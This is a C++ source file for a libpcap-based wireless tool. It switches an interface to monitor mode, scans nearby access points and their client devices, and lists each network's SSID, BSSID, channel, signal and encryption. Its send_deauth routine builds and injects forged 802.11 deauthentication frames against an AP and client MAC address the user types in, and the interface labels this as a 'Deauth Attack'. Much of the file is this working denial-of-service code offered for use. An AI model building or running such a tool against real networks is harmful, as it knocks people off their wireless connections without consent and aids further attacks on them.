#include "main.h"

CAnalyze::CAnalyze()
{
    _device_handle = NULL;
    _device_all = NULL;
    _device_temp = NULL;

    thread_statu = true;
}

CAnalyze::~CAnalyze()
{
    pcap_freealldevs(_device_all);
    pcap_freealldevs(_device_temp);
    _device_list.clear();
    _device_handle = NULL;
}

bool CAnalyze::selcet_device()
{
    if (all_device())
    {
        list<char *>::iterator iter;
        int inum, selcet;
        for (iter = _device_list.begin(), inum = 1; iter != _device_list.end(); ++iter, inum++)
            cout << "[" << inum << "] " << *iter << endl;
        cout << "[+] Select using wlan device number...";
        cin >> selcet;

        for (iter = _device_list.begin(), inum = 1; inum != selcet; ++iter, inum++)
            ;
        _device_name = *iter;
        string dev_str = string("sudo ifconfig ").append(*iter).append(" down");
        system(dev_str.c_str());
        dev_str = string("sudo iwconfig ").append(*iter).append(" mode monitor");
        system(dev_str.c_str());
        dev_str = string("sudo ifconfig ").append(*iter).append(" up");
        system(dev_str.c_str());

        cout << "[.] pcap_open_live()...";
        _device_handle = pcap_open_live(*iter, PCAP_READABLE_SIZE, PCAP_OPENFLAG_PROMISCUOUS, -1, _errbuf);
        if (_device_handle == NULL)
        {
            cout << "[ERROR] pcap_open_live() error : " << _errbuf << endl;
            return false;
        }
        cout << "ok" << endl;
        cout << "[INFO] Get Device handle : " << _device_handle << endl;
    }
    else
        return false;
    return true;
}

bool CAnalyze::all_device()
{
    cout << "[.] pcap_findalldevs()...";
    if (pcap_findalldevs(&_device_all, _errbuf) == PCAP_ERROR)
    {
        cout << "[ERROR] pcap_findalldevs() error : " << _errbuf << endl;
        return false;
    }
    cout << "ok" << endl;

    int inum;
    for (_device_temp = _device_all, inum = 0; _device_temp != NULL; _device_temp = _device_temp->next, inum++)
        _device_list.push_back(_device_temp->name);
    if (inum == 0 && _device_temp == NULL)
    {
        cout << "[ERROR] Interface not found!" << endl;
        return false;
    }
    return true;
}

string CAnalyze::AddrByteToString(uint8_t *_src, int _bufSize)
{
    uint8_t uint8_1, uint8_2;
    int index = 0;
    char dst[_bufSize * 3];

    for (int i = 0; i < _bufSize; i++)
    {
        uint8_1 = _src[i] & 0xF0;
        uint8_1 = uint8_1 >> 4;
        if (uint8_1 > 9)
            uint8_1 = uint8_1 + 'A' - 10;
        else
            uint8_1 = uint8_1 + '0';

        uint8_2 = _src[i] & 0x0F;
        if (uint8_2 > 9)
            uint8_2 = uint8_2 + 'A' - 10;
        else
            uint8_2 = uint8_2 + '0';
        dst[index++] = uint8_1;
        dst[index++] = uint8_2;
        dst[index++] = ':';
    }
    dst[--index] = '\0';
    return string(dst);
}

void CAnalyze::AddrStringToByte(string _src, int _bufSize, uint8_t *_dst)
{
    int index = 0;
    for (int i = 0; i < _bufSize; i++)
    {
        unsigned char ch1, ch2;
        ch1 = (int)_src[i];
        if (ch1 == ':')
            continue;

        if (ch1 >= '0' && ch1 <= '9')
            ch1 -= 0x30;
        else if (ch1 >= 'A' && ch1 <= 'Z')
            ch1 -= 0x37;

        ch2 = (int)_src[i + 1];
        if (ch2 >= '0' && ch2 <= '9')
            ch2 -= 0x30;
        else if (ch2 >= 'A' && ch2 <= 'Z')
            ch2 -= 0x37;

        ch1 = ch1 << 4;
        _dst[index++] = ch1 + ch2;
        i++;
    }
    _dst[index] = '\0';
}

bool CAnalyze::get_info()
{
    const u_char *data;

    while (true)
    {
        if (thread_statu)
        {
            int result = pcap_next_ex(_device_handle, &header, &data);
            if (result == 0)
                continue;
            else if (result < 0)
            {
                cout << "[ERROR] pcap_next_ex() ERROR! " << endl;
                return false;
            }

            ieee80211_radiotap_header *pRadiotap = (struct ieee80211_radiotap_header *)data;
            int dataPointer = pRadiotap->it_len;

            ieee80211_frame *pFrame = (struct ieee80211_frame *)(data + dataPointer);
            uint8_t fType = pFrame->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
            uint8_t fSubType = pFrame->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

            if (fType == IEEE80211_FC0_TYPE_MGT && (fSubType == IEEE80211_FC0_SUBTYPE_BEACON || fSubType == IEEE80211_FC0_SUBTYPE_PROBE_RESP))
            {
                dataPointer += sizeof(struct ieee80211_frame);

                if (pFrame->i_addr3[0] != 0xFF)
                    ap_info.bssid = AddrByteToString(pFrame->i_addr3, IEEE80211_ADDR_LEN);
                else
                    ap_info.bssid = AddrByteToString(pFrame->i_addr2, IEEE80211_ADDR_LEN);

                ap_info.enc == IEEE80211_ENCRYPTION_UNKNOWN;

                ieee80211_mgt_beacon_t tBeacon = (ieee80211_mgt_beacon_t)(data + dataPointer);
                uint16_t beacon_capability = IEEE80211_BEACON_CAPABILITY(tBeacon);
                if (beacon_capability & IEEE80211_CAPINFO_PRIVACY)
                    ap_info.enc = IEEE80211_ENCRYPTION_WEP;
                else
                    ap_info.enc = IEEE80211_ENCRYPTION_OPEN;

                dataPointer += (sizeof(uint8_t) * 12); // Skip(Fixed Parameters)

                do
                {
                    ieee80211_management_infomation *pInfo = (struct ieee80211_management_infomation *)(data + dataPointer);
                    if ((pInfo->_tag_length + dataPointer) > (int)header->len)
                        break;

                    if ((pInfo->_tag_number == IEEE80211_ELEMID_SSID) && pInfo->_tag_length == 0)
                        ap_info.ssid = "Wildcard SSID";
                    else if ((pInfo->_tag_number == IEEE80211_ELEMID_SSID) && pInfo->_tag_data[0] == 0)
                        ap_info.ssid = "Wildcard SSID";
                    else if ((pInfo->_tag_number == IEEE80211_ELEMID_SSID) && pInfo->_tag_length != 0)
                        ap_info.ssid = string((char *)(data + dataPointer + (sizeof(uint8_t) * 2)), pInfo->_tag_length);
                    else if (pInfo->_tag_number == IEEE80211_ELEMID_DSPARMS)
                        ap_info.channel = pInfo->_tag_data[0];
                    else if (pInfo->_tag_number == IEEE80211_ELEMID_RSN)
                    {
                        if (ap_info.enc == IEEE80211_ENCRYPTION_WPA)
                            ap_info.enc = IEEE80211_ENCRYPTION_WPA2WPA;
                        else
                            ap_info.enc = IEEE80211_ENCRYPTION_WPA2;
                    }
                    else if (pInfo->_tag_number == IEEE80211_ELEMID_VENDOR)
                    {
                        ieee80211_management_vendor_infomation *pVenderInfo = (struct ieee80211_management_vendor_infomation *)(data + dataPointer);
                        if (pVenderInfo->_tag_oui == WPA_OUI && pVenderInfo->_tag_oui_type == WPA_OUI_TYPE)
                        {
                            if (ap_info.enc == IEEE80211_ENCRYPTION_WPA2)
                                ap_info.enc = IEEE80211_ENCRYPTION_WPA2WPA;
                            else
                                ap_info.enc = IEEE80211_ENCRYPTION_WPA;
                        }
                    }

                    if (pInfo->_tag_length != 0)
                        dataPointer += (int)pInfo->_tag_length;
                    dataPointer += (sizeof(uint8_t) * 2); // Skip(tag number + tag size)
                } while (dataPointer < (int)header->len);

                auto iter = all_ap.find(ap_info.bssid);
                if (iter != all_ap.end())
                {
                    get_radiotap(data, &ap_info.signal);
                    iter->second.signal = ap_info.signal;
                }
                else
                {
                    get_radiotap(data, &ap_info.signal);
                    all_ap.insert(pair<string, AP_INFO>(ap_info.bssid, ap_info));
                }
            }
            else if ((fType == IEEE80211_FC0_TYPE_DATA) && (fSubType == IEEE80211_FC0_SUBTYPE_QOS))
            {
                ieee80211_qosframe *pQosFrame = (struct ieee80211_qosframe *)(data + dataPointer);

                uint8_t dsStatus = pQosFrame->i_fc[1] & IEEE80211_FC1_DIR_MASK;
                string tDev, tAp;
                if (dsStatus == IEEE80211_FC1_DIR_FROMDS)
                {
                    tDev = AddrByteToString(pFrame->i_addr1, IEEE80211_ADDR_LEN);
                    tAp = AddrByteToString(pFrame->i_addr2, IEEE80211_ADDR_LEN);
                }
                else if (dsStatus == IEEE80211_FC1_DIR_TODS)
                {
                    tDev = AddrByteToString(pFrame->i_addr2, IEEE80211_ADDR_LEN);
                    tAp = AddrByteToString(pFrame->i_addr1, IEEE80211_ADDR_LEN);
                }
                else
                    continue;

                auto iter = all_ap.find(tAp);
                if (iter != all_ap.end())
                    iter->second.dev.insert(tDev);
            }
        }
    }
}

void CAnalyze::get_radiotap(const u_char *_data, uint8_t *_signal)
{
    ieee80211_radiotap_header *pRadiotap = (struct ieee80211_radiotap_header *)_data;
    int dataPointer = sizeof(struct ieee80211_radiotap_header);
    if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_EXT))
        dataPointer += (sizeof(uint32_t));

    while (true)
    {
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_TSFT))
            dataPointer += sizeof(uint64_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_FLAGS))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_RATE))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_CHANNEL))
        {
            needPadding(&dataPointer);
            dataPointer += (sizeof(uint16_t) * 2);
        }
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_FHSS))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DBM_ANTSIGNAL))
        {
            *_signal = *((int8_t *)(_data + dataPointer));
            dataPointer += sizeof(int8_t);

            if (!(pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_EXT)))
                break;
        }
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DBM_ANTNOISE))
            dataPointer += sizeof(int8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_LOCK_QUALITY))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_TX_ATTENUATION))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DB_TX_ATTENUATION))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DBM_TX_POWER))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_ANTENNA))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DB_ANTSIGNAL))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DB_ANTNOISE))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_RX_FLAGS))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_TX_FLAGS))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_RTS_RETRIES))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_DATA_RETRIES))
            dataPointer += sizeof(uint8_t);
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_MCS))
            needPadding(&dataPointer, sizeof(uint16_t));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_AMPDU_STATUS))
            needPadding(&dataPointer, sizeof(uint32_t) + sizeof(uint16_t) + (sizeof(uint8_t) * 2));
        if (pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_VHT))
            needPadding(&dataPointer, (sizeof(uint16_t) * 2) + (sizeof(uint8_t) * 8));
        if ((pRadiotap->it_present & BIT(IEEE80211_RADIOTAP_EXT)))
        {
            pRadiotap->it_present = *((uint32_t *)(_data + (sizeof(struct ieee80211_radiotap_header))));
            continue;
        }
    }
}

bool CAnalyze::send_deauth()
{
    while (true)
    {
        if (thread_statu)
        {
            for (auto iter = deauth_list.begin(); iter != deauth_list.end(); iter++)
            {
                u_char deAuth[43] = {0};
                int deAuth_pointer = 0;

                ieee80211_radiotap_header deAuth_radiotap;
                deAuth_radiotap.it_version = PKTHDR_RADIOTAP_VERSION;
                deAuth_radiotap.it_pad = 0x00; // The it_pad field is currently unused.
                deAuth_radiotap.it_present = 0x00;
                deAuth_radiotap.it_present |= BIT(IEEE80211_RADIOTAP_FLAGS);
                deAuth_radiotap.it_present |= BIT(IEEE80211_RADIOTAP_RATE);
                deAuth_radiotap.it_present |= BIT(IEEE80211_RADIOTAP_CHANNEL);
                deAuth_radiotap.it_present |= BIT(IEEE80211_RADIOTAP_DBM_ANTSIGNAL);
                deAuth_radiotap.it_present |= BIT(IEEE80211_RADIOTAP_ANTENNA);
                deAuth_radiotap.it_present |= BIT(IEEE80211_RADIOTAP_RX_FLAGS);
                deAuth_radiotap.it_len = sizeof(struct ieee80211_radiotap_header) + sizeof(struct ieee80211_radiotap_present);
                memcpy(deAuth, &deAuth_radiotap, sizeof(struct ieee80211_radiotap_header));
                deAuth_pointer += sizeof(struct ieee80211_radiotap_header);

                ieee80211_radiotap_present deAuth_radiotap_info;
                deAuth_radiotap_info._flags = 0x00;
                deAuth_radiotap_info._rate = 0x02;
                deAuth_radiotap_info._channel = htons(0x7609); // 2422MHz channel 3
                deAuth_radiotap_info._channel_flags = 0x00;
                deAuth_radiotap_info._channel_flags |= IEEE80211_CHAN_CCK;
                deAuth_radiotap_info._channel_flags |= IEEE80211_CHAN_2GHZ;
                deAuth_radiotap_info._antenna_signal = 0xcd;
                deAuth_radiotap_info._antenna = 0x01;
                deAuth_radiotap_info._rx_flags = htons(0x0000);
                memcpy(deAuth + deAuth_pointer, &deAuth_radiotap_info, sizeof(struct ieee80211_radiotap_present));
                deAuth_pointer += sizeof(struct ieee80211_radiotap_present);

                ieee80211_frame deAuth_frame;
                deAuth_frame.i_fc[0] = IEEE80211_FC0_SUBTYPE_DEAUTH;
                deAuth_frame.i_fc[1] = IEEE80211_FC0_TYPE_MGT;
                deAuth_frame.i_dur[0] = 0x3A;
                deAuth_frame.i_dur[1] = 0x01;
                AddrStringToByte(iter->dev, iter->dev.size(), deAuth_frame.i_addr1);
                AddrStringToByte(iter->bssid, iter->bssid.size(), deAuth_frame.i_addr2);
                AddrStringToByte(iter->bssid, iter->bssid.size(), deAuth_frame.i_addr3);
                memcpy(deAuth + deAuth_pointer, &deAuth_frame, sizeof(struct ieee80211_frame));
                deAuth_pointer += sizeof(struct ieee80211_frame);

                deAuth[deAuth_pointer++] = IEEE80211_REASON_NOT_ASSOCED;
                deAuth[deAuth_pointer++] = 0x00;

                if(pcap_sendpacket(_device_handle, deAuth, deAuth_pointer) != 0)
                {
                    cout << "[ERROR] pcap_sendpacket() error : " << _errbuf << endl;
                    return false;
                }
                
                iter->count++;
                if(iter->count == 100)
                {
                    deauth_list.erase(iter);
                    break;                    
                }
            }
            sleep(0.5);
        }
    }
    return true;
}

void CAnalyze::print_ap()
{
    while (true)
    {
        if (thread_statu)
        {
            sleep(1);
            system("clear");
            cout << "\x1B[33m [SSID]\t\t\t\t  [BSSID]\t\t[CHANNEL]\t[SIGNAL]\t[ENCRYPT]\x1B[0m" << endl;
            for (auto iter = all_ap.begin(); iter != all_ap.end(); iter++)
            {
                cout.setf(ios::left);
                cout << " " << padding(28) << iter->second.ssid;
                cout << padding(31) << iter->second.bssid;
                cout << padding(14) << (int)iter->second.channel;
                cout << padding(16) << ((int)(iter->second.signal) - 256);
                switch (iter->second.enc)
                {
                case IEEE80211_ENCRYPTION_UNKNOWN:
                    cout << "UNKNOWN" << endl;
                    break;
                case IEEE80211_ENCRYPTION_OPEN:
                    cout << "OPEN" << endl;
                    break;
                case IEEE80211_ENCRYPTION_WEP:
                    cout << "WEP" << endl;
                    break;
                case IEEE80211_ENCRYPTION_WPA:
                    cout << "WPA" << endl;
                    break;
                case IEEE80211_ENCRYPTION_WPA2:
                    cout << "WPA2" << endl;
                    break;
                case IEEE80211_ENCRYPTION_WPA2WPA:
                    cout << "WPA2WPA" << endl;
                    break;
                default:
                    cout << endl;
                    break;
                }

                bool isDev = false;
                for (auto iter_dev = iter->second.dev.begin(); iter_dev != iter->second.dev.end(); iter_dev++)
                {
                    cout << "  - (Dev) " << *iter_dev << endl;
                    isDev = true;
                }
                if (isDev)
                    cout << endl;                
            }

            cout << "\n \x1B[31m[Attack Event]\x1B[0m" << endl;
            for (auto iter = deauth_print_list.begin(); iter != deauth_print_list.end(); iter++)
            {
                cout << " " << iter->bssid;
                cout << "  >  ";
                cout << iter->dev << endl;
            }

            cout << "\n \x1B[32mShutdown, Press the [ESC/esc] key." << endl;
            cout << " Deauth Attack, Press the [A/a] key.\x1B[0m" << endl;
        }
    }
}

void CAnalyze::change_channel()
{
    int channel_num = 1;
    while (true)
    {
        if (thread_statu)
        {
            string channel_str = string("sudo iwconfig ").append(_device_name).append(" channel ").append(to_string(channel_num).c_str());
            system(channel_str.c_str());
            if (channel_num == 12)
                channel_num = 1;
            else
                channel_num++;
            sleep(1);
        }
    }
}

int CAnalyze::getch()
{
    int ch;

    struct termios buf;
    struct termios save;

    tcgetattr(0, &save);
    buf = save;

    buf.c_lflag &= ~(ICANON | ECHO);
    buf.c_cc[VMIN] = 1;
    buf.c_cc[VTIME] = 0;

    tcsetattr(0, TCSAFLUSH, &buf);

    ch = getchar();
    tcsetattr(0, TCSAFLUSH, &save);

    return ch;
}

void CAnalyze::thread_control()
{
    while (1)
    {
        if (thread_statu)
        {
            int ch = getch();
            if (ch == 27)
                exit(0);
            else if (ch == 97 || ch == 41)
            {
                thread_statu = false;
                sleep(1);
                cout << " \x1B[31m[Deauth Attack] Enter MAC Address(AP addr, Dev addr) : \x1B[0m";
                Deauth tDeauth;
                cin >> tDeauth.bssid;
                cin >> tDeauth.dev;
                tDeauth.count = 0;
                deauth_list.push_back(tDeauth);
                deauth_print_list.push_back(tDeauth);
                thread_statu = true;
            }
        }
    }
}

void CAnalyze::do_start()
{
    thread info(&CAnalyze::get_info, this);
    thread print(&CAnalyze::print_ap, this);
    //thread channel(&CAnalyze::change_channel, this);
    thread deauth(&CAnalyze::send_deauth, this);
    thread control(&CAnalyze::thread_control, this);

    info.join();
    print.join();
    //channel.join();
    deauth.join();
    control.join();
}

int main(int agrc, char *argv[])
{
    CAnalyze analyze;
    if (analyze.selcet_device())
        analyze.do_start();

    return 0;
}